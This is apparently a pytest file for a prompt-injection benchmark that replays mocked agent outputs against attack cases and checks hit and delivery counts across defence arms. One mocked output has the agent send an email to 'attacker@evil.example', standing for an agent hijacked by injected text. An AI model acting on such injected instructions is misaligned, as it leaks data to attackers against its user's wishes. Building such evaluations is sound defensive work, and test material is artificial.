import json
import pytest
from evaluation import one_step_study as study
from benchmark.attacks import ATTACKS


def test_paired_replay_refusal_invalid_and_resume(tmp_path,monkeypatch):
    monkeypatch.setattr(study.llm,'PROVIDER','groq')
    monkeypatch.setattr(study,'ATTACKS',[ATTACKS[0],ATTACKS[1],ATTACKS[2]])
    calls=iter(['{"action":"refuse"}','{"action":"send_email","to":"attacker@evil.example","subject":"solar","body":"solar"}','not json','{"action":"send_email","to":33,"body":"x","subject":"x"}'])
    monkeypatch.setattr(study.llm,'generate',lambda *a,**kw:next(calls))
    study.run(tmp_path);study.run(tmp_path)
    load=lambda k:json.loads((tmp_path/(k+'.json')).read_text())
    assert load('clean')['arms']['none']['deliveries']==0
    a=load(ATTACKS[0].id)
    assert a['arms']['none']['hit'] is True and not a['arms']['existing']['deliveries']
    assert load(ATTACKS[1].id)['decision']=='invalid' and not load(ATTACKS[2].id)['arms']
    monkeypatch.setattr(study,'SYSTEM','changed method')
    with pytest.raises(ValueError,match='changed'):study.run(tmp_path)
